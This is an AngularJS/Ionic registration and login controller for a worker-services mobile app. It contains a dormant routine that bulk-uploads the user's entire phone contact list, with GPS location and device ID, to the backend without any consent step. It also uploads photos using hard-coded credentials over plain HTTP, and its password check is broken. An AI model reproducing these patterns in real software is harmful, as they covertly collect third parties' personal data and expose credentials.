/**
 * Created by spider-ninja on 11/27/16.
 */
angular.module('starter.controllers')


    .controller('RegCtrl', function ($scope, $state, $ionicLoading, $timeout, $ionicHistory, $cordovaGeolocation, $localstorage,
                                     PhoneContactsFactory, $ionicPlatform, $cordovaDevice, $window, $cordovaLocalNotification, $cordovaCamera, BlueTeam) {


        console.log("regcont started");

        //photo,name,mobile,password,address,experience,services,city,area

        $scope.user = {};
        $scope.data = {};

        $scope.registered = true;
        $scope.checked = false;

        $scope.user.profile_pic_id = 0;
        $scope.user.area_id = 0;
        $scope.user.city_id = 0;



        $scope.position = {
            "coords": {
                "longitude": null,
                "latitude": null
            }
        };

        var posOptions = {
            timeout: 10000,
            enableHighAccuracy: false
        };
        $cordovaGeolocation
            .getCurrentPosition(posOptions)
            .then(function (position) {


                $scope.position = position;

            }, function (err) {

                console.log(JSON.stringify(err));
                $scope.position = {
                    "coords": {
                        "longitude": null,
                        "latitude": null
                    }
                };


            });


        $scope.show = function () {
            $ionicLoading.show({
                template: 'Loading...'
            });
        };
        $scope.hide = function () {
            $ionicLoading.hide();
        };


        $scope.getAreas = function(){

            console.log($scope.user.city_id);
            BlueTeam.getCityAreas($scope.user.city_id).then(function (d) {

                $scope.areas = d.areas;
                console.log(JSON.stringify($scope.areas));

            });
        };

        $scope.login = function () {


            $scope.show();
            BlueTeam.loginUser({

                        "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                        "mobile": $scope.user.mobile,
                        "password": $scope.user.password,
                        "device_id": $cordovaDevice.getUUID()


                })
                .then(function (d) {

                    //setObject
                    $scope.hide();

                    if (d.user.id) {

                        $localstorage.set('user', JSON.stringify(d.user));
                        $localstorage.set('user_id', d.user.id);
                        $localstorage.set('services', JSON.stringify(d.user.services));

                        $timeout(function () {
                            $window.location.reload(true);
                        }, 5000);
                        $state.go('tab.service-list');



                    } else {
                        $scope.pwdError = true;
                    }

                });


        }
        $scope.checkReg = function () {
            console.log("trying to check");
            if ($scope.checked == false && $scope.user.mobile != undefined) {
                $scope.checked = true;
                BlueTeam.checkMobile($scope.user.mobile)
                    .then(function (d) {

                        console.log(d.status);
                        if(d.status == false){
                            BlueTeam.getServiceProviderServices("").then(function (d) {


                                $scope.serviceProviders = d.allServices;
                                console.log(JSON.stringify($scope.serviceProviders));

                            });

                            BlueTeam.getCities().then(function (d) {

                                $scope.cities = d.cities;
                                console.log(JSON.stringify($scope.serviceProviders));

                            });
                        }
                        $scope.registered = d.status;

                    });


            }
            /*else $scope.data.password = "";*/
        };
        $scope.pwdError = false;
        $scope.checkSamePwd = function () {

            if ($scope.user.password != $scope.user.conf_password) {
                $scope.pwdError = true;
            }
            $scope.pwdError = false;


        };

        $ionicPlatform.ready(function () {
            $scope.scheduleSingleNotification = function () {
                $cordovaLocalNotification.schedule({
                    id: 1,
                    title: 'Hi, got net request',
                    text: 'Need maid',
                    data: {
                        customProperty: 'custom value'
                    }
                }).then(function (result) {
                    // ...
                });
            };

            //$scope.scheduleSingleNotification();

            $scope.findContact = function () {
                // var fields = ["id", "displayName", "name", "nickname", "phoneNumbers", "emails", "addresses", "ims", "organizations", "birthday", "note", "photos", "categories", "urls"];

                PhoneContactsFactory.find().then(function (contacts) {
                    $arr = [];
                    $buff = [];
                    if ($localstorage.get('lastContactId'))
                        lastContactId = parseInt($localstorage.get('lastContactId'));
                    else
                        lastContactId = -1;
                    var newlastContactId = lastContactId;
                    console.log("Last Id saved ", lastContactId);
                    var j = 0;
                    var i = 0
                    for (i = 0; i < contacts.length; i++) {

                        if (lastContactId < contacts[i].id) {
                            $arr.push({
                                //name: contacts[i].name.formatted,
                                id: contacts[i].id,
                                all: JSON.stringify(contacts[i])
                            });


                            $buff.push({
                                //name: contacts[i].name.formatted,
                                id: contacts[i].id,
                                all: contacts[i]
                            });

                            if (lastContactId < contacts[i].id)
                                newlastContactId = contacts[i].id;

                            j++;

                            if (j > 20) {

                                BlueTeam.postRaw({
                                        "root": {
                                            "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                                            "raw": $buff,

                                            "device_id": $cordovaDevice.getUUID()
                                        }
                                    }, "contacts")
                                    .then(function (d) {


                                    });
                                j = 0;
                                $buff = [];

                            }
                        }
                    }


                    $localstorage.set('lastContactId', newlastContactId);
                    if ($buff.length > 0) {
                        BlueTeam.postRaw({
                                "root": {
                                    "gps_location": $scope.position.coords.latitude + ',' + $scope.position.coords.longitude,
                                    "raw": $buff,

                                    "device_id": $cordovaDevice.getUUID()
                                }
                            }, "contacts")
                            .then(function (d) {


                            });

                    }
                    //$scope.contacts = $arr;
                    //console.log(JSON.stringify($scope.contacts));


                });
            };
            //$scope.findContact();


        });


        if ($localstorage.get('name') === undefined || $localstorage.get('mobile') === undefined || $localstorage.get('email') === undefined ||
            $localstorage.get('name') === "" || $localstorage.get('mobile') === "") {

        } else {
            $ionicHistory.clearHistory();
            if ($localstorage.get('type') == "worker")
                $state.go('tab.worker-timer');
            else
                $state.go('tab.service-list');
        }


        $scope.data = {"ImageURI": "Select Image"};
        $scope.takePicture = function () {
            console.log("take Pic Got clicked");

            var options = {
                quality: 50,
                destinationType: Camera.DestinationType.FILE_URL,
                sourceType: Camera.PictureSourceType.CAMERA
            };
            $cordovaCamera.getPicture(options).then(
                function (imageData) {
                    $scope.picData = imageData;
                    $scope.ftLoad = true;
                    $localstorage.set('fotoUp', imageData);

                    $ionicLoading.show({template: 'wait...', duration: 500});
                    $scope.uploadPicture();
                },
                function (err) {
                    $ionicLoading.show({template: 'Error...', duration: 500});
                })
        }

        $scope.selectPicture = function () {



            var options = {
                quality: 50,
                destinationType: Camera.DestinationType.FILE_URI,
                sourceType: Camera.PictureSourceType.PHOTOLIBRARY
            };

            $cordovaCamera.getPicture(options).then(
                function (imageURI) {
                    window.resolveLocalFileSystemURL(imageURI, function (fileEntry) {

                        $scope.picData = fileEntry.toURL();
                        $scope.ftLoad = true;
                        $scope.uploadPicture();
                        console.log($scope.picData);
                        //var image = document.getElementById('myImage');
                        //image.src = fileEntry.nativeURL;
                    });
                    $ionicLoading.show({template: 'wait...', duration: 500});
                },
                function (err) {
                    $ionicLoading.show({template: 'error...', duration: 500});
                })
        };

        $scope.uploadPicture = function () {
            $ionicLoading.show({template: 'wait uploading the document, this may take a while ..'});

            var fileURL = $scope.picData;

            var options = new FileUploadOptions();
            options.fileKey = "fileToUpload";
            options.fileName = fileURL.substr(fileURL.lastIndexOf('/') + 1) + ".jpg";
            options.mimeType = "image/jpeg";
            options.chunkedMode = true;

            var params = {};
            params.username = "rahul";
            params.password = "rahul";

            options.params = params;

            var ft = new FileTransfer();
            ft.upload(
                fileURL,
                encodeURI("http://api.file-dog.shatkonlabs.com/files/rahul"),
                viewUploadedPictures,
                function (error) {
                    $ionicLoading.show({
                        template: 'Something went wrong ...'
                    });
                    $ionicLoading.hide();
                },
                options);
        };
        var viewUploadedPictures = function (response) {
            console.log(JSON.stringify(response), "hi", response.response);
            $ionicLoading.show({template: 'trying to load the pic ...'});
            server = "http://api.file-dog.shatkonlabs.com/files/rahul/" + JSON.parse(response.response).file.id;

            $scope.user.profile_pic_id = JSON.parse(response.response).file.id;

            $scope.picData = server;
            $scope.ftLoad = true;
            console.log($scope.picData);

            $ionicLoading.hide();
        }

        $scope.basicRegDone = false;
        $scope.userServices = [];

        $scope.regUserServices = function(){


            BlueTeam.regUserServices($scope.user.id,$scope.userServices)
                .then(function (d) {

                    //setObject
                    $localstorage.set('services', JSON.stringify($scope.userServices));
                    $scope.basicRegDone = true;



                    if(d.error){

                        $scope.error = d.error;

                    }

                    $scope.hide();
                    $timeout(function () {
                     $window.location.reload(true);
                     }, 5000);


                     $state.go('tab.service-list');

                });
        };


        $scope.regUser = function () {

            if($scope.user.name == ""){
                $scope.error = "please enter your name";
                return;
            }
            if($scope.user.profile_pic_id == 0){
                    $scope.error = "please select your profile picture";
                return;
            }

            if($scope.user.services.length == 0){
                $scope.error = "please select at least 1 service";
                return;
            }
            if($scope.user.city_id == 0){
                $scope.error = "please select your city";
                return;
            }
            if($scope.user.area_id == 0){
                $scope.error = "please select your area";
                return;
            }
            $scope.error = null;
            if ($scope.checked == false) {
                $scope.checkReg();
                return;
            }
            if ($scope.registered) {
                $scope.login();
                return;
            }

            if ($scope.user.password == $scope.user.conf_password) {

                $scope.show();

                $scope.user.location = $scope.position.coords.latitude + ',' + $scope.position.coords.longitude;
                $scope.user.device = null;
                $scope.user.device = $cordovaDevice.getUUID();

                BlueTeam.regUser($scope.user)
                    .then(function (d) {

                        $scope.hide();
                        //setObject
                        $localstorage.set('user', JSON.stringify(d.service_providers));
                        $localstorage.set('user_id', d.service_providers.id);

                        $scope.basicRegDone = true;

                        for(var i=0; i<$scope.user.services.length; i++){

                            for(var j=0;j<$scope.serviceProviders.length;j++){
                                if($scope.serviceProviders[j].id == $scope.user.services[i] ){
                                    var temp = {};
                                    temp.id = $scope.user.services[i];
                                    temp.name = $scope.serviceProviders[j].name;
                                    temp.pic_id = $scope.serviceProviders[j].pic_id;

                                    $scope.userServices.push(temp);

                                }
                            }


                        }
                        console.log(JSON.stringify($scope.userServices));

                        console.log(JSON.stringify(d.service_providers));
                        d.service_providers.mobile = d.service_providers.mobile*1;
                        d.service_providers.experience = d.service_providers.experience*1;

                        $scope.user = d.service_providers;


                        if(d.error){

                            $scope.error = d.error;

                        }


                        /*$timeout(function () {
                            $window.location.reload(true);
                        }, 5000);


                        $state.go('tab.service-list');*/

                    });
            }
            else
                $scope.pwdError = true;
        };
    })

;